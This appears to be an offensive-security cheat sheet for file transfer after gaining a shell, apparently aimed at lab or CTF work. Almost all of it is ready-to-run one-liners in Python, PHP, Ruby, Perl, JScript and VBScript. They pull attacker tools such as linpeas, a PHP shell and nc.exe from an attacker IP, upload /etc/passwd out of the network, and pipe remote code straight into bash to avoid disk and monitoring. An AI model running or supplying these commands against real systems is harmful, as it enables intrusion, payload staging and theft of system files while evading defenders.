# File Transfer (Scripting)
**Context:** You have a shell on a target, but standard tools (`wget`, `curl`) are missing or monitored. You must "Live Off The Land" (LOLBins) using installed interpreters (Python, PHP, Ruby) to bring in your toolkit.
## 1. Python (The Standard)
**Availability:** Installed on almost all Linux servers. Python 3 is standard; Python 2 is legacy.
### Python 3 - One-Liner Download
**Syntax:** `urllib.request.urlretrieve("URL", "Output_File")`
```shell
# Download file from Attacker IP
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.5/linpeas.sh", "linpeas.sh")'
```
### Python 2 - Legacy Download
**Syntax:** `urllib.urlretrieve` (Note the library difference)
```shell
# Download on older systems
python2 -c 'import urllib;urllib.urlretrieve("http://10.10.14.5/exploit.py", "exploit.py")'
```
### Upload (Exfiltration)
**Context:** Sending files _out_ of the network via HTTP POST.
```shell
# Upload /etc/passwd to Attacker Listening Server
python3 -c 'import requests;requests.post("http://10.10.14.5:8000/upload",files={"f":open("/etc/passwd","rb")})'
```
## 2. PHP (Web Servers)
**Availability:** Common on web servers (Apache/Nginx). 
**Key Insight:** PHP can execute code entirely in memory (Fileless) by piping network data directly to `bash`.
### Download Methods
```shell
# Method 1: file_get_contents (Simple)
php -r '$f = file_get_contents("http://10.10.14.5/shell.php"); file_put_contents("shell.php",$f);'

# Method 2: fopen (Robust - Handles streams better)
php -r 'const B = 1024; $r = fopen("http://10.10.14.5/shell.php", "rb"); $l = fopen("shell.php", "wb"); while ($b = fread($r, B)) { fwrite($l, $b); } fclose($l); fclose($r);'
```
### Fileless Execution (Pipe to Bash)
**OPSEC:** High. The script is never written to disk.
```shell
# Downloads script and executes it immediately
php -r '$lines = @file("http://10.10.14.5/linpeas.sh"); foreach ($lines as $l) { echo $l; }' | bash
```
## 3. Ruby (Legacy/Specific)
**Availability:** Ruby is common on Puppet/Chef nodes. Perl is on almost all legacy Unix.
### Ruby Download
```shell
ruby -e 'require "net/http"; File.write("shell.sh", Net::HTTP.get(URI.parse("http://10.10.14.5/shell.sh")))'
```
## 4. Perl (Legacy/Specific)
### Perl Download
```shell
# using LWP::Simple
perl -e 'use LWP::Simple; getstore("http://10.10.14.5/shell.sh", "shell.sh");'
```
## 5. Windows Legacy Scripting (VBS / JS)
**Context:** PowerShell is disabled or monitored. You must use the legacy Windows Script Host (`cscript.exe`). 
**Method:** You often have to `echo` these scripts line-by-line into a file on the victim machine before executing them.
### JavaScript (`wget.js`)
**Code:**
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Creation & Execution:**
```shell
# 1. Create the file (Copy-Paste or Echo)
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); > wget.js
echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); >> wget.js
echo WinHttpReq.Send(); >> wget.js
echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.js
echo BinStream.Type = 1; >> wget.js
echo BinStream.Open(); >> wget.js
echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.js
echo BinStream.SaveToFile(WScript.Arguments(1)); >> wget.js

# 2. Execute
cscript.exe /nologo wget.js http://10.10.14.5/nc.exe nc.exe
```
### VBScript (`wget.vbs`)
**Code:**
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Execution:**
```powershell
cscript.exe /nologo wget.vbs http://10.10.14.5/nc.exe nc.exe
```